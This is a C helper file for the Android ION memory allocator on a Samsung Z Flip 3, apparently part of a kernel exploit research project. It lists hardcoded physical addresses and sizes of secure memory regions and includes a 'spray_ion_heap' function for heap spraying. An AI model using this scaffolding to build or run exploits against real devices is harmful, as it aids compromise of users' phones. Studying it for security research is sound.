#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "ion_utils.h"

uint64_t ion_heap_phys_addr(uint32_t id) {
  //Specific to Z flip 3
  switch (id) {
    case ION_AUDIO_ML_HEAP_ID: //audio_cma_region
      return 0xe8000000;
    case ION_SECURE_DISPLAY_HEAP_ID://secure_display_region
      return 0xf2800000;
    case ION_QSECOM_TA_HEAP_ID://qseecom_ta_region
      return 0xe2000000;
    case ION_QSECOM_HEAP_ID://qseecom_region
      return 0xe6400000;
    case ION_USER_CONTIG_HEAP_ID://user_contig_region
      return 0xf1800000;
    case ION_SPSS_HEAP_ID://sp_region
      return 0xecc00000;
    case ION_ADSP_HEAP_ID://sdsp_region
      return 0xedc00000;
    case ION_SECURE_CARVEOUT_HEAP_ID://ion_secure_carveout
      return 0x80c00000;
    default:
      err(1, "heap does not have physical address\n");
  }
}

uint64_t ion_heap_size(uint32_t id) {
  //Specific to Z flip 3
  switch (id) {
    case ION_AUDIO_ML_HEAP_ID: //audio_cma_region
      return 28 * 1024 * 1024;
    case ION_SECURE_DISPLAY_HEAP_ID://secure_display_region
      return 212 * 1024 * 1024;
    case ION_QSECOM_TA_HEAP_ID://qseecom_ta_region
      return 32 * 1024 * 1024;
    case ION_QSECOM_HEAP_ID://qseecom_region
      return 28 * 1024 * 1024;
    case ION_USER_CONTIG_HEAP_ID://user_contig_region
      return 16 * 1024 * 1024;
    case ION_SPSS_HEAP_ID://sp_region
      return 16 * 1024 * 1024;
    case ION_ADSP_HEAP_ID://sdsp_region
      return 8 * 1024 * 1024;
    case ION_SECURE_CARVEOUT_HEAP_ID://ion_secure_carveout
      return 0x600000;
    default:
      err(1, "heap does not have physical address\n");
  }
}

void* spray_ion_heap(uint32_t id, size_t size) {
  int fd = open("/dev/ion", O_RDONLY);
  if (fd == -1) err(1, "cannot open ion\n");
  void* region = map_ion_region(fd, id, size);
  printf("ion region %p\n", region);
  if (region == NULL) err(1, "failed to map ion\n");
  return region;
}

int ion_allocate(int ion_fd, uint32_t id, size_t len) {
  struct ion_allocation_data ion_alloc_data = {0};
  ion_alloc_data.len = len;
  ion_alloc_data.heap_id_mask = id;
  int ret = ioctl(ion_fd, ION_IOC_ALLOC, &ion_alloc_data);
  if (ret < 0) err(1, "Failed to allocate ion buffer\n");
  return ion_alloc_data.fd;
}

void* map_ion_region(int ion_fd, uint32_t id, size_t len) {
  void* ion_region = NULL;
  struct ion_allocation_data ion_alloc_data = {0};
  ion_alloc_data.len = len;
  ion_alloc_data.heap_id_mask = id;
  printf("heap_id_mask %x\n", ion_alloc_data.heap_id_mask);
  int ret = ioctl(ion_fd, ION_IOC_ALLOC, &ion_alloc_data);
  if (ret == -ENOMEM) return NULL;
  if (ret < 0) err(1, "Failed to allocate ion buffer\n");
  ion_region = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, ion_alloc_data.fd, 0);
  if (ion_region == MAP_FAILED) {
    err(1, "map failed");
  }
  return ion_region;  
}
